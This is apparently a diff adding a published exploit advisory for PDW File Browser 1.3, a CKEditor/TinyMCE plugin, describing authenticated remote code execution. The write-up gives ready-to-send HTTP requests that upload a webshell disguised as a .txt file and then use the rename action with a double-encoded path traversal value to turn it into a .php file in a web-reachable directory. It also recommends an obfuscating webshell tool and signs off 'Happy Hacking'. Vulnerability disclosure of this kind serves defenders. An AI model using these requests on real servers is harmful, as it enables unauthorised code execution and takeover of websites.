@@ -1,0 +1,46 @@
+# Exploit Title: PDW File Browser 1.3 - Remote Code Execution
+# Date: 24-10-2020
+# Exploit Author: David Bimmel
+# Researchers: David Bimmel, Joost Vondeling, Ramòn Janssen
+# Vendor Homepage: n/a
+# Software Link: https://github.com/GuidoNeele/PDW-File-Browser
+# Version: <=1.3
+
+Attack type
+Remote
+
+Impact
+Remote Code Execution
+
+The PDW File Browser is a plugin for the TinyMCE and CKEditor WYSIWYG editors. The PDW File Browser contains a critical software vulnerability which results in remote code execution on the web server. This vulnerability can be exploited by all authenticated users.
+
+
+Steps to RCE:
+
+Upload a .txt file containing your webshell code using the default file upload functionality within the PDF file Browser. Please note that all users (including unauthenticated users) are able to access your webshell later on. For security purposes I would recommend using weevely (https://github.com/epinna/weevely3) as this obfuscated and password protects your webshell. Below I have provided how the request should look like for uploading your WEBSHELL.txt file.
+
+
+POST /ckeditor/plugins/pdw_file_browser/ajax_php_uploader.php?uploadpath=%2Fmedia%2F&qqfile=WEBSHELL.txt HTTP/1.1
+Host: <HOSTNAME>
+[…]
+<?php
+<WEBSHELLCODE HERE>
+?>
+
+
+Once you have uploaded your webshell with a .txt extension (WEBSHELL.txt) you are able to rename the file using the rename functionality of the PDW File Browser. 
+Within this functionality it is possible to both change the file extension your WEBSHELL from .txt to .php and move the file to an arbitrary location on the web server . The path to the arbitrary location should contain double encoded characters. 
+
+Below I have provided an example which both renames our WEBSHELL.txt to WEBSHELL.php and relocates the file to the 'content' directory.
+
+
+POST /ckeditor/plugins/pdw_file_browser/actions.php HTTP/1.1
+Host: <HOSTNAME>
+[…]
+action=rename&new_filename=%252E%252E%252Fcontent%252FWEBSHELL.php&old_filename=WEBSHELL.txt&folder=%252Fmedia%252F&type=file
+
+
+After this request your webshell should be located at ‘https://<TARGET>/content/WEBSHELL.php’
+
+
+Happy Hacking :^)
